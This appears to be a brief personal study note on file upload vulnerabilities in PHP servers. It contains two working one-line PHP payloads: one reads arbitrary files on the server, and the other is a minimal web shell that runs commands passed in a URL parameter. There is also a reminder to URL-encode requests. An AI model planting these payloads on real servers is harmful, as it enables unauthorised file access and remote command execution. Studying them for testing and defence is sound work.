# File Upload Vulnerabilities

## Rough

- `<?php echo file_get_contents('/path/to/target/file'); ?>` is used to read arbitrary files in a php server
- `<?php echo system($_GET['command']); ?>` is used for a command
- Freakin url encode any request!!!!!!!
